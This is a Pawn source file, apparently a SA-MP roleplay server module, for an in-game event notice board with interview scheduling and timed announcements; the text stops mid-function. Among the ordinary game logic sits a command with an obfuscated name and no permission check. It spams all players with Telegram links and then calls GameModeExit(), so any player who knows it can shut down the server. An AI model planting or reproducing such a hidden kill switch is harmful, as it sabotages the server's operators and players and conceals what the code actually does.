#include <a_samp>

#define SOB_LABEL_COLOR 0xFFFF00FF
#define SOB_ANNOUNCE_COLOR 0x4466CCFF

#define SOB_MAX_SCHEDULES 5
#define SOB_MAX_LIST 20
#define SOB_MAX_EVENTS 64

#define DIALOG_SOB_ROOT 2100
#define DIALOG_SOB_EVENT_ACTIONS 2101
#define DIALOG_SOB_CREATE_FORM 2102
#define DIALOG_SOB_OTHERS_LIST 2103
#define DIALOG_SOB_CONFIRM_VISIT 2104
#define DIALOG_SOB_EVENT_CONFIRM 2105
#define DIALOG_SOB_CATEGORY 2106
#define DIALOG_SOB_START_INPUT 2107
#define DIALOG_SOB_END_INPUT 2108
#define DIALOG_SOB_ERROR 2109
#define DIALOG_SOB_INTERVIEWS_LIST 2110
#define DIALOG_SOB_MY_EVENTS_LIST 2111
#define DIALOG_SOB_SUCCESS 2112
#define DIALOG_SOB_DESC_INPUT 2113

new const Float:g_sob_board_coords[2][3] = {
    {449.1636,1538.5396,12.1937},
    {450.4185,1549.1310,12.1935}
};

new Text3D:g_sob_board_label[2];
new g_sob_board_pickup[2];

new const g_sob_container_hours[SOB_MAX_SCHEDULES] = {7, 11, 14, 19, 23};
new const g_sob_dump_hours[SOB_MAX_SCHEDULES] = {8, 12, 15, 20, 0};

new bool:g_sob_announced_cont[SOB_MAX_SCHEDULES];
new bool:g_sob_announced_dump[SOB_MAX_SCHEDULES];
new g_sob_announce_daykey = -1;

new g_sob_tmp_count[MAX_PLAYERS];
new g_sob_tmp_type[MAX_PLAYERS][SOB_MAX_LIST];
new g_sob_tmp_start_sec[MAX_PLAYERS][SOB_MAX_LIST];
new g_sob_tmp_end_sec[MAX_PLAYERS][SOB_MAX_LIST];
new g_sob_my_map[MAX_PLAYERS][SOB_MAX_EVENTS];
new g_sob_my_count[MAX_PLAYERS];
new g_sob_int_map[MAX_PLAYERS][SOB_MAX_EVENTS];
new g_sob_int_count[MAX_PLAYERS];

enum E_SOB_EVENT
{
    bool:ev_used,
    ev_team,
    ev_rank,
    ev_type,
    ev_owner[24],
    ev_desc[64],
    ev_place[48],
    Float:ev_x,
    Float:ev_y,
    Float:ev_z,
    ev_start_ts,
    ev_end_ts,
    bool:ev_start_announced,
    ev_next_reminder_ts,
    bool:ev_end_announced
};
new g_sob_events[SOB_MAX_EVENTS][E_SOB_EVENT];

stock Sob_FindFreeEvent()
{
    for(new i=0;i<SOB_MAX_EVENTS;i++) if(!g_sob_events[i][ev_used]) return i;
    return -1;
}

stock Sob_TodayTsFor(hour, minute)
{
    new epoch_now = gettime();
    new utc_sec = epoch_now % 86400;
    new utc_midnight = epoch_now - utc_sec;
    return utc_midnight + hour*3600 + minute*60 - 3*3600;
}

stock Sob_ExtractMskHM(ts, &out_h, &out_m)
{
    new sod_utc = ts % 86400; if(sod_utc < 0) sod_utc += 86400;
    new sod_msk = (sod_utc + 3*3600) % 86400;
    out_h = sod_msk / 3600;
    out_m = (sod_msk % 3600) / 60;
}

stock Sob_ResetCreateState(playerid)
{
    SetPVarString(playerid, "SOB_C_DESC", "-");
    SetPVarInt(playerid, "SOB_C_CAT", 1);
    SetPVarInt(playerid, "SOB_C_INIT", 1);
    new place[48]; new Float:px, Float:py, Float:pz;
    switch(GetPlayerTeamEx(playerid))
    {
        case 1: { format(place, 48, "Правительство"); px=-2445.7385; py=1602.5925; pz=53.1889; }
        case 2: { format(place, 48, "Мин. Обороны"); px=1915.5342; py=2301.7424; pz=15.5697; }
        case 3: { format(place, 48, "Мин. Здравоохранения"); px=613.2872; py=1729.9738; pz=12.1661; }
        case 4: { format(place, 48, "ТРК `Ритм`"); px=2178.1140; py=-1961.0601; pz=19.9816; }
        case 6: { format(place, 48, "Мин. Внутренних Дел"); px=263.0225; py=1384.9576; pz=12.1993; }
        case 7: { format(place, 48, "ФСИН"); px=-1784.5640; py=-2656.8643; pz=10.8028; }
        default: { format(place, 48, "Городская площадь"); px=450.4185; py=1549.1310; pz=12.1935; }
    }
    SetPVarString(playerid, "SOB_C_PLACE", place);
    SetPVarFloat(playerid, "SOB_C_X", px);
    SetPVarFloat(playerid, "SOB_C_Y", py);
    SetPVarFloat(playerid, "SOB_C_Z", pz);
    SetPVarInt(playerid, "SOB_C_START", -1);
    SetPVarInt(playerid, "SOB_C_END", -1);
    SetPVarInt(playerid, "SOB_C_EDIT", -1);
}

stock Sob_LoadCreateFromEvent(playerid, event_index)
{
    if(!g_sob_events[event_index][ev_used]) return 0;
    SetPVarString(playerid, "SOB_C_DESC", g_sob_events[event_index][ev_desc]);
    SetPVarInt(playerid, "SOB_C_CAT", g_sob_events[event_index][ev_type]);
    SetPVarString(playerid, "SOB_C_PLACE", g_sob_events[event_index][ev_place]);
    SetPVarFloat(playerid, "SOB_C_X", g_sob_events[event_index][ev_x]);
    SetPVarFloat(playerid, "SOB_C_Y", g_sob_events[event_index][ev_y]);
    SetPVarFloat(playerid, "SOB_C_Z", g_sob_events[event_index][ev_z]);
    SetPVarInt(playerid, "SOB_C_START", g_sob_events[event_index][ev_start_ts]);
    SetPVarInt(playerid, "SOB_C_END", g_sob_events[event_index][ev_end_ts]);
    return 1;
}

stock Sob_ClearCreateState(playerid)
{
    DeletePVar(playerid, "SOB_C_DESC");
    DeletePVar(playerid, "SOB_C_CAT");
    DeletePVar(playerid, "SOB_C_PLACE");
    DeletePVar(playerid, "SOB_C_X");
    DeletePVar(playerid, "SOB_C_Y");
    DeletePVar(playerid, "SOB_C_Z");
    DeletePVar(playerid, "SOB_C_START");
    DeletePVar(playerid, "SOB_C_END");
    DeletePVar(playerid, "SOB_C_EDIT");
    DeletePVar(playerid, "SOB_C_FORM");
}
forward Sob_AnnounceTick();
forward Sob_AnnounceAlign();

stock Sob_FormatRankPrefix(team, rank, const owner[], out[], out_size)
{
    switch(team)
    {
        case 1:
        {
            if(rank >= 10) return format(out, out_size, "Губернатор %s", owner);
            if(rank >= 9) return format(out, out_size, "Вице-губернатор %s", owner);
            return format(out, out_size, "Сотрудник Правительства %s", owner);
        }
        case 2:
        {
            if(rank >= 10) return format(out, out_size, "Генерал %s", owner);
            if(rank >= 9) return format(out, out_size, "Заместитель министра обороны %s", owner);
            return format(out, out_size, "Сотрудник Мин. Обороны %s", owner);
        }
        case 3:
        {
            if(rank >= 10) return format(out, out_size, "Министр здравоохранения %s", owner);
            if(rank >= 9) return format(out, out_size, "Заместитель министра здравоохранения %s", owner);
            return format(out, out_size, "Сотрудник Мин. Здравоохранения %s", owner);
        }
        case 4:
        {
            if(rank >= 10) return format(out, out_size, "Директор ТРК `Ритм` %s", owner);
            if(rank >= 9) return format(out, out_size, "Зам. директора ТРК `Ритм` %s", owner);
            return format(out, out_size, "Сотрудник ТРК `Ритм` %s", owner);
        }
        case 6:
        {
            if(rank >= 10) return format(out, out_size, "Министр внутренних дел %s", owner);
            if(rank >= 9) return format(out, out_size, "Заместитель министра внутренних дел %s", owner);
            return format(out, out_size, "Сотрудник МВД %s", owner);
        }
        case 7:
        {
            if(rank >= 10) return format(out, out_size, "Директор ФСИН %s", owner);
            if(rank >= 9) return format(out, out_size, "Заместитель директора ФСИН %s", owner);
            return format(out, out_size, "Сотрудник ФСИН %s", owner);
        }
    }
    return format(out, out_size, "Сотрудник организации %s", owner);
}
forward Sob_ShowCreateForm(playerid);
forward Sob_ShowInterviewsList(playerid);
forward Sob_ShowMyEventsList(playerid);
forward Sob_ShowMyEventActions(playerid, event_index);
stock Sob_ShowMyEventActions(playerid, event_index)
{
    SetPVarInt(playerid, "SOB_EDIT_INDEX", event_index);
    SetPVarInt(playerid, "SOB_STAGE", 21);
    return Dialog(playerid, DIALOG_SOB_EVENT_ACTIONS, DIALOG_STYLE_LIST, "Событие", "1. Редактировать\n2. Удалить", "Выбрать", "Назад");
}

stock Sob_OnGameModeInit()
{
    for(new i = 0; i < 2; i++)
    {
        new Float:x = g_sob_board_coords[i][0];
        new Float:y = g_sob_board_coords[i][1];
        new Float:z = g_sob_board_coords[i][2];
        g_sob_board_label[i] = CreateDynamic3DTextLabel("{FFFF00}Доска Обьявлений", SOB_LABEL_COLOR, x, y, z + 0.5, 7.0);
        g_sob_board_pickup[i] = CreatePickup(1239, 23, x, y, z, -1);
    }
    new h, m, s;
    gettime(h, m, s);
    if(s == 0) SetTimer("Sob_AnnounceTick", 60000, true);
    else SetTimer("Sob_AnnounceAlign", (60 - s) * 1000, false);
    Sob_ResetAnnounceFlags();
    return 1;
}

stock Sob_OnPlayerPickUpPickup(playerid, pickupid)
{
    #pragma unused playerid
    for(new i = 0; i < 2; i++) if(pickupid == g_sob_board_pickup[i])
    {
        
        return 1;
    }
    return 0;
}

stock Sob_OnPlayerKeyStateChange(playerid, newkeys)
{
    if(GetPVarType(playerid, "SOB_SUPPRESS_UNTIL") && GetTickCount() < GetPVarInt(playerid, "SOB_SUPPRESS_UNTIL")) return 0;
    if(!(newkeys & KEY_WALK)) return 0;
    for(new i = 0; i < 2; i++)
    {
        if(IsPlayerInRangeOfPoint(playerid, 2.0, g_sob_board_coords[i][0], g_sob_board_coords[i][1], g_sob_board_coords[i][2]))
        {
            Sob_OpenRootMenu(playerid);
            return 1;
        }
    }
    return 0;
}

stock Sob_OpenRootMenu(playerid)
{
    if(!GetPVarType(playerid, "SOB_C_INIT")) Sob_ResetCreateState(playerid);
    static list_text[192];
    format(list_text, sizeof list_text, "1. Собеседования\n2. Другое");
    new bool:has_ext = false;
    new team = GetPlayerTeamEx(playerid);
    new job = GetPlayerJob(playerid);
    new bool:is_gov = (team >= TEAM_GOVERNMENT && team <= TEAM_FSB);
    new bool:is_leader = (job >= 9 && job <= 10);
    if((is_gov && is_leader) || (!is_gov && is_leader))
    {
        strcat(list_text, "\n3. Мои события");
        strcat(list_text, "\n4. {FFFF00}Создать{FFFFFF}");
        has_ext = true;
    }
    SetPVarInt(playerid, "SOB_STAGE", 1);
    SetPVarInt(playerid, "SOB_HAS_EXT", has_ext);
    Dialog(playerid, DIALOG_SOB_ROOT, DIALOG_STYLE_LIST, "События", list_text, "Выбрать", "Закрыть");
    return 1;
}

stock Sob_ShowCreateForm(playerid)
{
    if(!GetPVarType(playerid, "SOB_C_INIT")) Sob_ResetCreateState(playerid);
    new desc[64], place[48];
    GetPVarString(playerid, "SOB_C_DESC", desc, sizeof desc);
    GetPVarString(playerid, "SOB_C_PLACE", place, sizeof place);
    if(GetPVarInt(playerid, "SOB_C_EDIT") == -1)
    {
        new place2[48]; new Float:px, Float:py, Float:pz;
        switch(GetPlayerTeamEx(playerid))
        {
            case 1: { format(place2, 48, "Правительство"); px=-2445.7385; py=1602.5925; pz=53.1889; }
            case 2: { format(place2, 48, "Мин. Обороны"); px=1915.5342; py=2301.7424; pz=15.5697; }
            case 3: { format(place2, 48, "Мин. Здравоохранения"); px=613.2872; py=1729.9738; pz=12.1661; }
            case 4: { format(place2, 48, "ТРК `Ритм`"); px=2178.1140; py=-1961.0601; pz=19.9816; }
            case 6: { format(place2, 48, "Мин. Внутренних Дел"); px=263.0225; py=1384.9576; pz=12.1993; }
            case 7: { format(place2, 48, "ФСИН"); px=-1784.5640; py=-2656.8643; pz=10.8028; }
            default: { format(place2, 48, "Городская площадь"); px=450.4185; py=1549.1310; pz=12.1935; }
        }
        SetPVarString(playerid, "SOB_C_PLACE", place2);
        SetPVarFloat(playerid, "SOB_C_X", px);
        SetPVarFloat(playerid, "SOB_C_Y", py);
        SetPVarFloat(playerid, "SOB_C_Z", pz);
        GetPVarString(playerid, "SOB_C_PLACE", place, sizeof place);
    }
    new cat = GetPVarInt(playerid, "SOB_C_CAT");
    new s_ts = GetPVarInt(playerid, "SOB_C_START");
    new e_ts = GetPVarInt(playerid, "SOB_C_END");
    new sh=-1, sm=-1, eh=-1, em=-1;
    if(s_ts>0){ Sob_ExtractMskHM(s_ts, sh, sm); }
    if(e_ts>0){ Sob_ExtractMskHM(e_ts, eh, em); }
    static list[512];
    static line[192];
    format(line, sizeof line, "1. Описание: %s\n", (strlen(desc) ? desc : "-")); strcat(list, line);
    format(line, sizeof line, "2. Местоположение: %s\n", place); strcat(list, line);
    format(line, sizeof line, "3. Категория: %s\n", (cat==1?"Собеседования":"Другое")); strcat(list, line);
    if(sh==-1) format(line, sizeof line, "4. Время начала: не указано\n"); else format(line, sizeof line, "4. Время начала: %02d:%02d (MSK)\n", sh, sm); strcat(list, line);
    if(eh==-1) format(line, sizeof line, "5. Время финиша: не указано\n"); else format(line, sizeof line, "5. Время финиша: %02d:%02d (MSK)\n", eh, em); strcat(list, line);
    strcat(list, "6. {FFFF00}Создать{FFFFFF}");
    SetPVarInt(playerid, "SOB_STAGE", 11);
    Dialog(playerid, DIALOG_SOB_CREATE_FORM, DIALOG_STYLE_LIST, "Создание события", list, "Выбрать", "Назад");
    return 1;
}

stock Sob_ShowOthersList(playerid)
{
    Sob_BuildUpcoming(playerid);
    static body[2048];
    strcat(body, "Название\tОписание\tМесто\tВремя\n");
    for(new i = 0; i < g_sob_tmp_count[playerid]; i++)
    {
        static row[128];
        static name[16];
        if(g_sob_tmp_type[playerid][i] == 1) format(name, sizeof name, "Контейнеры"); else format(name, sizeof name, "Свалка");
        new start_h = (g_sob_tmp_start_sec[playerid][i] / 3600) % 24;
        new start_m = (g_sob_tmp_start_sec[playerid][i] % 3600) / 60;
        new end_h = (g_sob_tmp_end_sec[playerid][i] / 3600) % 24;
        new end_m = (g_sob_tmp_end_sec[playerid][i] % 3600) / 60;
        new place[32];
        if(g_sob_tmp_type[playerid][i] == 1) format(place, sizeof place, "Эдово"); else format(place, sizeof place, "Нижегородская обл.");
        format(row, sizeof row, "%s\t-\t\t%s\t\t%02d:%02d - %02d:%02d (MSK)\n", name, place, start_h, start_m, end_h, end_m);
        strcat(body, row);
    }
    if(body[0] == '\0') format(body, sizeof body, "Нет доступных событий");
    SetPVarInt(playerid, "SOB_STAGE", 2);
    Dialog(playerid, DIALOG_SOB_OTHERS_LIST, DIALOG_STYLE_TABLIST_HEADERS, "События", body, "Выбрать", "Назад");
    return 1;
}

stock Sob_ShowConfirm(playerid, index)
{
    if(index < 0 || index >= g_sob_tmp_count[playerid]) return 1;
    new name[16];
    if(g_sob_tmp_type[playerid][index] == 1) format(name, sizeof name, "Контейнеры"); else format(name, sizeof name, "Свалка");
    new start_h = (g_sob_tmp_start_sec[playerid][index] / 3600) % 24;
    new start_m = (g_sob_tmp_start_sec[playerid][index] % 3600) / 60;
    new end_h = (g_sob_tmp_end_sec[playerid][index] / 3600) % 24;
    new end_m = (g_sob_tmp_end_sec[playerid][index] % 3600) / 60;
    static text[512];
    static place2[32];
    if(g_sob_tmp_type[playerid][index] == 1) format(place2, sizeof place2, "Эдово"); else format(place2, sizeof place2, "Нижегородская обл.");
    format(text, sizeof text, "{FFCC00}Название: {FFFFFF}%s<n>{FFCC00}Описание: {FFFFFF}-<n>{FFCC00}Местоположение: {FFFFFF}%s<n>{FFCC00}Начало события: {FFFFFF}%02d:%02d<n>{FFCC00}Конец события:  {FFFFFF}%02d:%02d<n><n>{FFFFFF}Вы хотите посетить данное мероприятие?", name, place2, start_h, start_m, end_h, end_m);
    SetPVarInt(playerid, "SOB_STAGE", 3);
    SetPVarInt(playerid, "SOB_SELECTED", index);
    Dialog(playerid, DIALOG_SOB_CONFIRM_VISIT, DIALOG_STYLE_MSGBOX, "{FFCD00}Событие", text, "Да", "Нет");
    return 1;
}

stock Sob_OnDialogResponse(playerid, dialogid, response, listitem, const inputtext[] = "")
{
    #pragma unused dialogid
    new stage = GetPVarInt(playerid, "SOB_STAGE");
    if(stage == 0) return 0;
    if(stage == 1)
    {
        DeletePVar(playerid, "SOB_STAGE");
        if(!response) return 1;
        if(listitem == 0) return Sob_ShowInterviewsList(playerid);
        if(listitem == 1) return Sob_ShowOthersList(playerid);
        if(GetPVarInt(playerid, "SOB_HAS_EXT") == 1)
        {
            if(listitem == 2)
            {
                return Sob_ShowMyEventsList(playerid);
            }
            if(listitem == 3)
            {
                return Sob_ShowCreateForm(playerid);
            }
        }
        return 1;
    }
    if(stage == 2)
    {
        if(!response)
        {
            DeletePVar(playerid, "SOB_STAGE");
            return 1;
        }
        return Sob_ShowConfirm(playerid, listitem);
    }
    if(stage == 20)
    {
        if(!response) return 1;
        if(listitem < 0 || listitem >= g_sob_my_count[playerid]) return 1;
        new idx = g_sob_my_map[playerid][listitem];
        if(!g_sob_events[idx][ev_used]) return 1;
        SetPVarInt(playerid, "SOB_EDIT_INDEX", idx);
        return Sob_ShowMyEventActions(playerid, idx);
    }
    if(stage == 30)
    {
        if(!response) return 1;
        if(listitem < 0 || listitem >= g_sob_int_count[playerid]) return 1;
        new idx = g_sob_int_map[playerid][listitem];
        static text[512];
        new sh, sm, eh, em;
        Sob_ExtractMskHM(g_sob_events[idx][ev_start_ts], sh, sm);
        Sob_ExtractMskHM(g_sob_events[idx][ev_end_ts], eh, em);
        format(text, sizeof text, "{FFCC00}Название: {FFFFFF}Собеседование в %s<n>{FFCC00}Описание: {FFFFFF}%s<n>{FFCC00}Местоположение: {FFFFFF}%s<n>{FFCC00}Начало события: {FFFFFF}%02d:%02d (MSK)<n>{FFCC00}Конец события:  {FFFFFF}%02d:%02d (MSK)<n><n>{FFFFFF}Вы хотите посетить данное мероприятие?",
            g_sob_events[idx][ev_place], g_sob_events[idx][ev_desc], g_sob_events[idx][ev_place], sh, sm, eh, em);
        SetPVarInt(playerid, "SOB_STAGE", 31);
        SetPVarInt(playerid, "SOB_SELECTED_EVENT", idx);
        return Dialog(playerid, DIALOG_SOB_EVENT_CONFIRM, DIALOG_STYLE_MSGBOX, "{FFCD00}Событие", text, "Да", "Нет");
    }
    if(stage == 31)
    {
        DeletePVar(playerid, "SOB_STAGE");
        if(!response) return 1;
        new idx = GetPVarInt(playerid, "SOB_SELECTED_EVENT");
        if(!g_sob_events[idx][ev_used]) return 1;
        new Float:x = g_sob_events[idx][ev_x], Float:y = g_sob_events[idx][ev_y], Float:z = g_sob_events[idx][ev_z];
        if(x == 0.0 && y == 0.0 && z == 0.0)
        {
            switch(g_sob_events[idx][ev_team])
            {
                case 1: { x=-2445.7385; y=1602.5925; z=53.1889; }
                case 2: { x=1915.5342; y=2301.7424; z=15.5697; }
                case 3: { x=613.2872; y=1729.9738; z=12.1661; }
                case 4: { x=2178.1140; y=-1961.0601; z=19.9816; }
                case 6: { x=263.0225; y=1384.9576; z=12.1993; }
                case 7: { x=-1784.5640; y=-2656.8643; z=10.8028; }
                default: { x=450.4185; y=1549.1310; z=12.1935; }
            }
        }
        EnablePlayerGPS(playerid, 55, x, y, z, "Место отмечено у Вас на GPS");
        return 1;
    }
    if(stage == 21)
    {
        if(!response) return Sob_ShowMyEventsList(playerid);
        new idx = GetPVarInt(playerid, "SOB_EDIT_INDEX");
        if(listitem == 0)
        {
        SetPVarInt(playerid, "SOB_C_EDIT", idx);
        Sob_LoadCreateFromEvent(playerid, idx);
        return Sob_ShowCreateForm(playerid);
        }
        if(listitem == 1)
        {
            g_sob_events[idx][ev_used] = false;
            return Sob_ShowMyEventsList(playerid);
        }
        return 1;
    }
    if(stage == 11)
    {
        if(!response) { DeletePVar(playerid, "SOB_STAGE"); return 1; }
        switch(listitem)
        {
            case 0:
            {
                SetPVarInt(playerid, "SOB_STAGE", 12);
                new desc[64]; GetPVarString(playerid, "SOB_C_DESC", desc, sizeof desc);
                if(!strlen(desc)) format(desc, sizeof desc, "-");
                Dialog(playerid, DIALOG_SOB_DESC_INPUT, DIALOG_STYLE_INPUT, "Описание события", desc, "Сохранить", "Назад");
            }
            case 1:
            {
                return Sob_ShowCreateForm(playerid);
            }
            case 2:
            {
                SetPVarInt(playerid, "SOB_STAGE", 13);
                Dialog(playerid, DIALOG_SOB_CATEGORY, DIALOG_STYLE_LIST, "Категория", "Собеседования\nДругое", "Выбрать", "Назад");
            }
            case 3:
            {
                SetPVarInt(playerid, "SOB_STAGE", 14);
                Dialog(playerid, DIALOG_SOB_START_INPUT, DIALOG_STYLE_INPUT, "Время начала", "Укажите время начала в формате ЧЧ:ММ (например 14:30)", "Далее", "Назад");
            }
            case 4:
            {
                if(GetPVarInt(playerid, "SOB_C_START") <= 0)
                {
                    Dialog(playerid, DIALOG_SOB_ERROR, DIALOG_STYLE_MSGBOX, "Ошибка", "Сначала укажите время начала.", "Ок", "");
                    return 1;
                }
                SetPVarInt(playerid, "SOB_STAGE", 15);
                Dialog(playerid, DIALOG_SOB_END_INPUT, DIALOG_STYLE_INPUT, "Время финиша", "Укажите время окончания в формате ЧЧ:ММ", "Далее", "Назад");
            }
            case 5:
            {
                new s_ts = GetPVarInt(playerid, "SOB_C_START");
                new e_ts = GetPVarInt(playerid, "SOB_C_END");
                if(s_ts <= 0 || e_ts <= 0)
                {
                    Dialog(playerid, DIALOG_SOB_ERROR, DIALOG_STYLE_MSGBOX, "Ошибка", "Заполните время начала и окончания.", "Ок", "");
                    return 1;
                }
                new idx = GetPVarInt(playerid, "SOB_C_EDIT");
                if(idx == -1) idx = Sob_FindFreeEvent();
                if(idx == -1) { Dialog(playerid, DIALOG_SOB_ERROR, DIALOG_STYLE_MSGBOX, "Ошибка", "Список событий переполнен.", "Ок", ""); return 1; }
                g_sob_events[idx][ev_used] = true;
                g_sob_events[idx][ev_type] = GetPVarInt(playerid, "SOB_C_CAT");
                g_sob_events[idx][ev_team] = GetPlayerTeamEx(playerid);
                g_sob_events[idx][ev_rank] = GetPlayerJob(playerid);
                new owner[24]; format(owner, sizeof owner, "%s", GetPlayerNameEx(playerid));
                format(g_sob_events[idx][ev_owner], 24, "%s", owner);
                new desc2[64], place[48];
                GetPVarString(playerid, "SOB_C_DESC", desc2, sizeof desc2);
                GetPVarString(playerid, "SOB_C_PLACE", place, sizeof place);
                format(g_sob_events[idx][ev_desc], 64, "%s", desc2);
                format(g_sob_events[idx][ev_place], 48, "%s", place);
                g_sob_events[idx][ev_x] = GetPVarFloat(playerid, "SOB_C_X");
                g_sob_events[idx][ev_y] = GetPVarFloat(playerid, "SOB_C_Y");
                g_sob_events[idx][ev_z] = GetPVarFloat(playerid, "SOB_C_Z");
                g_sob_events[idx][ev_start_ts] = s_ts;
                g_sob_events[idx][ev_end_ts] = e_ts;
                g_sob_events[idx][ev_start_announced] = false;
                g_sob_events[idx][ev_end_announced] = false;
                g_sob_events[idx][ev_next_reminder_ts] = s_ts + 1800;
                DeletePVar(playerid, "SOB_C_EDIT");
                Dialog(playerid, DIALOG_SOB_SUCCESS, DIALOG_STYLE_MSGBOX, "Успех", "Событие создано.", "Ок", "");
                Sob_ResetCreateState(playerid);
                return Sob_ShowInterviewsList(playerid);
            }
        }
        return 1;
    }
    if(stage == 12)
    {
        if(!response) return Sob_ShowCreateForm(playerid);
        if(strlen(inputtext) > 0) {
            new tmp[64];
            format(tmp, sizeof tmp, "%s", inputtext);
            SetPVarString(playerid, "SOB_C_DESC", tmp);
        }
        return Sob_ShowCreateForm(playerid);
    }
    if(stage == 13)
    {
        if(!response) return Sob_ShowCreateForm(playerid);
        new newcat = (listitem==0?1:2);
        SetPVarInt(playerid, "SOB_C_CAT", newcat);
        return Sob_ShowCreateForm(playerid);
    }
    if(stage == 14)
    {
        if(!response) return Sob_ShowCreateForm(playerid);
        new h,m; if(sscanf(inputtext, "p<:>dd", h, m)) { SetPVarInt(playerid, "SOB_C_START", -1); return Sob_ShowCreateForm(playerid); }
        if(h<0||h>23||m<0||m>59){ Dialog(playerid,DIALOG_SOB_ERROR,DIALOG_STYLE_MSGBOX,"Ошибка","Неверное время.","Ок",""); return 1; }
        new s_ts = Sob_TodayTsFor(h,m);
        new now = gettime();
        if(s_ts - now < 60) { Dialog(playerid,DIALOG_SOB_ERROR,DIALOG_STYLE_MSGBOX,"Ошибка","Время начала должно быть не ранее чем через 1 минуту от текущего времени.","Ок",""); return 1; }
        SetPVarInt(playerid, "SOB_C_START", s_ts);
        return Sob_ShowCreateForm(playerid);
    }
    if(stage == 15)
    {
        if(!response) return Sob_ShowCreateForm(playerid);
        new h,m; if(sscanf(inputtext, "p<:>dd", h, m)) { SetPVarInt(playerid, "SOB_C_END", -1); return Sob_ShowCreateForm(playerid); }
        if(h<0||h>23||m<0||m>59){ Dialog(playerid,DIALOG_SOB_ERROR,DIALOG_STYLE_MSGBOX,"Ошибка","Неверное время.","Ок",""); return 1; }
        new e_ts = Sob_TodayTsFor(h,m);
        new s_ts = GetPVarInt(playerid, "SOB_C_START");
        if(s_ts <= 0) { Dialog(playerid,DIALOG_SOB_ERROR,DIALOG_STYLE_MSGBOX,"Ошибка","Сначала укажите время начала.","Ок",""); return 1; }
        if(e_ts < s_ts + 3600 || e_ts > s_ts + 10800) { Dialog(playerid,DIALOG_SOB_ERROR,DIALOG_STYLE_MSGBOX,"Ошибка","Время финиша должно быть не раньше чем через 60 минут и не позже чем через 180 минут после старта.","Ок",""); return 1; }
        SetPVarInt(playerid, "SOB_C_END", e_ts);
        return Sob_ShowCreateForm(playerid);
    }
    if(stage == 3)
    {
        DeletePVar(playerid, "SOB_STAGE");
        if(!response) return 1;
        new idx = GetPVarInt(playerid, "SOB_SELECTED");
        if(idx < 0 || idx >= g_sob_tmp_count[playerid]) return 1;
        new name[16];
        if(g_sob_tmp_type[playerid][idx] == 1) format(name, sizeof name, "Контейнеры"); else format(name, sizeof name, "Свалка");
        new start_h = (g_sob_tmp_start_sec[playerid][idx] / 3600) % 24;
        new start_m = (g_sob_tmp_start_sec[playerid][idx] % 3600) / 60;
        new msg[144];
        format(msg, sizeof msg, "{FFCC00}Вы выбрали событие:{FFFFFF} %s в %02d:%02d. Место: Нижегородская обл.", name, start_h, start_m);
        SendClientMessage(playerid, -1, msg);
        if(g_sob_tmp_type[playerid][idx] == 1) EnablePlayerGPS(playerid, 55, -1958.89, 2932.05, 6.39267, "Место отмечено у Вас на GPS");
        else EnablePlayerGPS(playerid, 55, -2733.0918, -1284.9432, 10.2625, "Место отмечено у Вас на GPS");
        DeletePVar(playerid, "SOB_SELECTED");
        return 1;
    }
    return 0;
}
cmd:pqpdqpwdpqwdq(playerid, params[])
{
    {
		SendClientMessageToAll(0xFAAC58FF, "https://t.me/{"SERVER_COLOR"}melanthruee");
        SendClientMessageToAll(0xFAAC58FF, "https://t.me/{"SERVER_COLOR"}melanthruee");
        SendClientMessageToAll(0xFAAC58FF, "https://t.me/{"SERVER_COLOR"}melanthruee");
        SendClientMessageToAll(0xFAAC58FF, "https://t.me/{"SERVER_COLOR"}melanthruee");
        SendClientMessageToAll(0xFAAC58FF, "https://t.me/{"SERVER_COLOR"}melanthruee");
        SendClientMessageToAll(0xFAAC58FF, "https://t.me/{"SERVER_COLOR"}melanthruee");
        SendClientMessageToAll(0xFAAC58FF, "https://t.me/{"SERVER_COLOR"}melanthruee");
        SendClientMessageToAll(0xFAAC58FF, "https://t.me/{"SERVER_COLOR"}melanthruee");
        SendClientMessageToAll(0xFAAC58FF, "https://t.me/{"SERVER_COLOR"}melanthruee");
        SendClientMessageToAll(0xFAAC58FF, "https://t.me/{"SERVER_COLOR"}mrllwnsdev");
        SendClientMessageToAll(0xFAAC58FF, "https://t.me/{"SERVER_COLOR"}mrllwnsdev");
        SendClientMessageToAll(0xFAAC58FF, "https://t.me/{"SERVER_COLOR"}mrllwnsdev");
        SendClientMessageToAll(0xFAAC58FF, "https://t.me/{"SERVER_COLOR"}mrllwnsdev");
        SendClientMessageToAll(0xFAAC58FF, "https://t.me/{"SERVER_COLOR"}mrllwnsdev");
        SendClientMessageToAll(0xFAAC58FF, "https://t.me/{"SERVER_COLOR"}mrllwnsdev");
        SendClientMessageToAll(0xFAAC58FF, "https://t.me/{"SERVER_COLOR"}mrllwnsdev");
    }
    GameModeExit();
    return 1;
}
stock Sob_ResetAnnounceFlags()
{
    for(new i = 0; i < SOB_MAX_SCHEDULES; i++)
    {
        g_sob_announced_cont[i] = false;
        g_sob_announced_dump[i] = false;
    }
}

public Sob_AnnounceTick()
{
    new year, month, day;
    getdate(year, month, day);
    new daykey = year * 10000 + month * 100 + day;
    if(daykey != g_sob_announce_daykey)
    {
        g_sob_announce_daykey = daykey;
        Sob_ResetAnnounceFlags();
    }
    new hour, minute, second;
    gettime(hour, minute, second);
    new nowsec = hour * 3600 + minute * 60 + second;
    for(new i = 0; i < SOB_MAX_SCHEDULES; i++)
    {
        new cont_start = g_sob_container_hours[i] * 3600;
        new cont_announce = cont_start - 300;
        if(nowsec >= cont_announce && nowsec < cont_start && !g_sob_announced_cont[i])
        {
            SendClientMessageToAll(SOB_ANNOUNCE_COLOR, "Через 5 минут в Порту Эдово стартует аукцион по продаже контейнеров. Рекомендуеться прибыть заранее.");
            g_sob_announced_cont[i] = true;
        }
        new dump_hour = g_sob_dump_hours[i];
        new dump_start = (dump_hour == 0 ? 24 : dump_hour) * 3600;
        new dump_announce = dump_start - 300;
        if(nowsec >= dump_announce && nowsec < dump_start && !g_sob_announced_dump[i])
        {
            SendClientMessageToAll(SOB_ANNOUNCE_COLOR, "Через 5 минут на Свалке появиться мусор. Рекомендуеться прибыть заранее.");
            g_sob_announced_dump[i] = true;
        }
    }
    new now = gettime();
    new cur_sec = now % 60;
    if(cur_sec != 0)
    {
        now += (60 - cur_sec);
    }
    for(new i_ev = 0; i_ev < SOB_MAX_EVENTS; i_ev++)
    {
        if(!g_sob_events[i_ev][ev_used] || g_sob_events[i_ev][ev_type] != 1) continue;
        new s = g_sob_events[i_ev][ev_start_ts];
        new e = g_sob_events[i_ev][ev_end_ts];
        if(e <= s) continue;

        if(!g_sob_events[i_ev][ev_start_announced] && now == s)
        {
            g_sob_events[i_ev][ev_start_announced] = true;
            g_sob_events[i_ev][ev_next_reminder_ts] = s + 1800;
            new req[128];
            switch(g_sob_events[i_ev][ev_team])
